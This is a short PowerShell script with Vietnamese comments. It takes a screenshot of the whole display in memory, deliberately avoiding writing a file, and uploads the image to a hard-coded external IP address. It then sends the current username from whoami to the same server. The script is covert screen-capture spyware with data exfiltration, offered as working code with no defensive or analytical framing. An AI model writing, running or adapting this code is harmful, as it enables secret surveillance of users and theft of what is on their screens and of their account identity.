# Địa chỉ server nhận dữ liệu
$hq = "103.88.108.100:443"
$name = whoami

# Chụp màn hình trực tiếp vào bộ nhớ
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen 

$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)

# Chuyển ảnh sang MemoryStream thay vì lưu vào file
$memoryStream = New-Object System.IO.MemoryStream
$bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
$bitmap.Dispose()
$graphics.Dispose()

# Chuyển MemoryStream thành mảng byte để gửi đi
$imageData = $memoryStream.ToArray()
$memoryStream.Dispose()

# Gửi dữ liệu hình ảnh tới server
$uriUpload = "$hq/upload"
$client = New-Object System.Net.WebClient
$client.Headers.Add("Content-Type", "application/octet-stream")
$client.UploadData($uriUpload, "POST", $imageData)

# Gửi tên người dùng
$uriData = "$hq/data"
$client.Headers.Clear()
$client.Headers.Add("Content-Type", "application/json")
$data = @{ name = $name }
$jsonData = $data | ConvertTo-Json -Depth 10
$client.UploadString($uriData, "POST", $jsonData)
